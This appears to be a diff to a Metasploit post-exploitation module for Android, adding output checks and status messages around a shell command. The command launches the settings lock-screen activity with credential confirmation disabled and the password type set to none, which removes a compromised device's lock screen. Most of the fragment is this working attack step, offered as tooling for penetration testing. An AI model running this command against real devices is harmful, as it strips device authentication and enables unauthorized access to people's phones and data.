@@ -46,7 +46,13 @@ class Metasploit4 < Msf::Post
       return
     end
 
-    cmd_exec('am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task')
+    output = cmd_exec('am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task')
+    if output =~ /Error:/
+        print_error("The Intent could not be started")
+        vprint_status("Command output: #{output}")
+    else
+        print_good("Intent started, the lock screen should now have been removed")
+    end
   end
 
 end
